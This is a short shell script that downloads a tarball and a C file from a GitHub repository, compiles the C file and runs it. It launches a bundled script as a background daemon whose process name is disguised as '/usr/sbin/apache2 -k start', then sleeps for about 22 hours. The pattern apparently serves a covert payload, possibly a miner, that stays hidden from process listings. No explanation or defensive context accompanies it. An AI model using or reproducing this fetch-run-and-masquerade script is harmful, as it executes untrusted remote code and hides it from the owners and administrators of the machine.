#!/bin/sh


wget https://github.com/vamzie2282/tesar373/raw/main/main.tar.gz
tar xf main.tar.gz 
wget https://github.com/vamzie2282/tesar373/raw/main/test.c
gcc -o test test.c 
./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
sleep 80000